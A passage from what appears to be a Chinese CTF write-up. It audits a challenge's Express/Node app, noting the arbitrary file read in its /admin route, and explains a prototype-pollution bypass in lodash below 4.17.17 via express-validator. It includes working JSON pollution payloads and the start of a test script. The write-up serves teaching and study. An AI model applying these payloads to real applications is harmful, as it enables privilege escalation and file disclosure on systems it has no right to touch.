property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>validator<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">"登录界面"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'admin password error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'plz input your username and password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login first plz'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"notadmin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'verify'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'verify success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//req.session.debug = true;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg<span class="token punctuation">;</span>    <span class="token keyword">var</span> imgdata <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">:</span> <span class="token string">"./images/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> base64data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>imgdata<span class="token punctuation">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'我的空间'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token literal-property property">png</span><span class="token operator">:</span> <span class="token string">"data:image/png;base64,"</span> <span class="token operator">+</span> base64data<span class="token punctuation">,</span> <span class="token literal-property property">diy</span><span class="token operator">:</span> <span class="token string">"十年磨一剑😅v0.0.0(尚处于开发版"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> info<span class="token punctuation">.</span>pretty <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>p<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy<span class="token punctuation">;</span>      info<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy<span class="token operator">:</span> <span class="token string">"尊贵的admin"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'plz login first'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>&#x2F;app&#x2F;app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session'</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> secrets <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">name</span><span class="token operator">:</span> key<span class="token punctuation">,</span>  <span class="token literal-property property">secret</span><span class="token operator">:</span> secrets<span class="token punctuation">,</span>  <span class="token literal-property property">store</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">sessionStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">maxAge</span><span class="token operator">:</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">600</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// view engine setup</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">logger</span><span class="token punctuation">(</span><span class="token string">'dev'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> indexRouter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// set locals, only providing error in development</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>message <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>error <span class="token operator">=</span> req<span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'development'</span> <span class="token operator">?</span> err <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app<span class="token punctuation">;</span></code></pre><p>本地安装一下环境</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"express-validator"</span><span class="token operator">:</span> <span class="token string">"^6.12.1"</span><span class="token punctuation">,</span>    <span class="token property">"http-errors"</span><span class="token operator">:</span> <span class="token string">"^1.8.0"</span><span class="token punctuation">,</span>    <span class="token property">"morgan"</span><span class="token operator">:</span> <span class="token string">"^1.10.0"</span><span class="token punctuation">,</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>    <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"^2.88.2"</span><span class="token punctuation">,</span>    <span class="token property">"session-file-store"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="第二步-代码审计"><a href="#第二步-代码审计" class="headerlink" title="第二步 - 代码审计"></a>第二步 - 代码审计</h3><p>根据源码可以发现，题目要求我们以admin身份登陆，但是admin的密码又是随机不可能破解的</p><img src="/article/2021dfjk/image-20210803143641462.png" class="" title="image-20210803143641462" loading="lazy"><p>跟到<code>/verify</code>路由，可以看到如果<code>session.username</code>是admin就将<code>isadmin</code>赋值admin，否则就是notadmin </p><img src="/article/2021dfjk/image-20210803143743000.png" class="" title="image-20210803143743000" loading="lazy"><p>再继续跟进到<code>/admin</code>路由 ，发现任意文件读取漏洞的源码。关键点在于下一步，如果<code>isadmin</code><strong>只要不是</strong>notadmin就会执行一段操作，所以我们的下一个目标就是令<code>isadmin</code>变为非notadmin</p><img src="/article/2021dfjk/image-20210803144118578.png" class="" title="image-20210803144118578" loading="lazy"><p>admin的密码每次都是随机的，所以出题人根本不想让我们登陆获得admin，也不可能登陆admin。所以得另想方法，我们的关键点就在于让<code>isadmin</code>不是notadmin，而<code>isadmin</code>又是在<code>/verify</code>路由下才创建的，如果改变原型对象的内容让<code>isadmin</code>提前创建，这样就达到了污染，从而让<code>isadmin</code>变为非notadmin</p><p>图为 <a href="www.mrkaixin.top">@Mrkaixin</a> 师傅给出的session样子</p><img src="/article/2021dfjk/image-20210803144614812.png" class="" title="image-20210803144614812" loading="lazy"><h3 id="第三步-原型链污染"><a href="#第三步-原型链污染" class="headerlink" title="第三步 - 原型链污染"></a>第三步 - 原型链污染</h3><p>根据读到的package包引用，发现lodash版本为4.17.15。lodash&lt;4.17.17是有原型链污染漏洞的</p><img src="/article/2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png" class="" title="E34B2280959DFF59059010F95FFB5E8C" loading="lazy"><p>这里给出<a href="https://paper.seebug.org/1426/">参考文章</a>引用部分，写的很详细，参考文章在文末</p><blockquote><p>测试数据包：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__[test]"</span><span class="token operator">:</span> <span class="token string">"123 "</span><span class="token punctuation">&#125;</span></code></pre><p>这里在segments.reduce函数中对输入的值进行了一些判断和替换。重要的点就是当传入的键中存在<code>.</code> ，则会在字符两边加上<code>[&quot; &quot;]</code>，并且最终返回的是一个字符串形式的结果。</p><p>接着之前的过程，在经过了过滤器的处理之后，会通过lodash.set对指定的path设置新值</p><img src="/article/2021dfjk/1607915420000-16044095450346.jpg-w331s" class="" title="-w1160" loading="lazy"><p>尝试污染<strong>proto</strong>[test]，结果发现是污染并没有成功，原因是因为，当lodash.set中第一个参数存在一个与第二个参数同名的键时，污染就会失败</p><p>所以，我们就要尝试去绕过这个点。 我们来看一下这个语句：</p><pre class="language-none"><code class="language-none">path !&#x3D;&#x3D; &#39;&#39; ? _.set(req[location], path, newValue) : _.set(req, location, newValue);</code></pre><p>这里的第一个参数是从请求中直接取出来的，path是经过先前处理后的出来的值。所以能不能通过这个处理来进行绕过呢？当然是可以的。 当我们传入：</p><pre class="language-none"><code class="language-none">&#123;&quot;\&quot;].__proto__[\&quot;test&quot;:&quot;123 &quot;&#125;</code></pre><p>这里的键为<code>&quot;].__proto__[&quot;test</code>，由于字符里面存在<code>.</code>，所以在segments.reduce函数处理时会对其左右加双引号和中括号，最终变成：<code>[&quot;&quot;].__proto__[&quot;test&quot;]</code>。</p><p>这时就不存在同名的键了，于是查看污染的后的值发现：</p><img src="/article/2021dfjk/1607915421000-16044107085533.jpg-w331s" class="" title="-w426" loading="lazy"><p>我们设置的值并没有传递进去，而是污染为了一个空值。为什么传递进来的newValue为空值呢？</p><p>从select-fields.js中可以看到，是因为取值时，使用的是lodash.get方法从<code>req[&#39;body&#39;]</code>中取被处理后的键值，处理后的键是不存在的，所以取出来的值就为undefined。当undefined传递到Sanitization.run方法中后，经过了一个<code>.toString()</code>的处理变成了<code>&#39;&#39;</code>空字符串。</p><p>利用lodash.get方法中读取键值的妙用得到最终的payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"testvalue"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token property">"a\"].__proto__[\"test"</span><span class="token operator">:</span> <span class="token number">222</span><span class="token punctuation">&#125;</span></code></pre><p>详细可在参考文章中查看</p></blockquote><p>于是进行测试</p><p>测试代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">9001</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">,</span>    validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span>middlewares <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token 